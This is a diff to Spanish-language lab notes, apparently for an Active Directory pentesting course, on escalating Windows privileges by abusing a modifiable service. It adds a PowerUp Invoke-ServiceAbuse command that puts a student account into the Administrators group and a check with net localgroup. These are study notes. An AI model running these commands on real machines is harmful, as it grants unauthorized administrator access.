@@ -73,4 +73,15 @@ Invoke-AllChecks
 > 	- Modifiable Service Files -> Son servicios que pueden ser modificados, si tienen *CanRestart = True* significa que el atacante lo puede reiniciar para escalar privilegios
 
 ### Explotar servicio
-Nos añadiremos al servicio que esta corriendo como Syste
+Nos añadiremos al servicio que y se nos agregara el ususario al grupo Administrators
+```shell
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -username 'dcorp\student97'
+```
+
+Para comprobar que hemos sido añadidos usaremos
+```shell
+net localgroup Administrators
+```
+
+>Viendo a nuestro usuario reflejado dentro del grupo
+
